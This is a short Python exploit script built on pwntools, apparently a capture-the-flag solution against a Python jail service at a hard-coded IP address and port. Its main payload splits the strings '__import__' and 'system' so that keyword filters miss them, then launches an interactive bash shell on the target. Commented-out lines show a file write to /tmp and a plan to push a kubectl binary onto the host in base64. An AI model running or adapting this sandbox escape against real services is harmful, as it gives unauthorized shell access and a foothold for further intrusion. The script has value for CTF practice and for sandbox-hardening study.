from pwn import *
import os
ip='34.93.14.197'
port = 31337

if __name__ == "__main__":
    #kube = os.popen('base64 kubectl').read()
    #print(kube)
    io = remote(ip,port)
    #payload2 = f"__builtins__.__dict__['__impo'+'rt__']('o'+'s').__dict__['wr'+'ite'](__builtins__.__dict__['__impo'+'rt__']('o'+'s').__dict__['op'+'en']('/tmp/test',66),b'abc')"
    payload = b"__builtins__.__dict__['__impo'+'rt__']('o'+'s').__dict__['sys'+'tem']('/bin/bash -i')"
    io.recvuntil(b'>>> ')
    io.sendline(payload)
    io.recvuntil(b'>>> ')
    #kube = os.popen('cat kube.txt').read()
    #io.sendline(f"base64 -d '{kube}'|tr -d \"\n\" > /tmp/curl")
    io.interactive()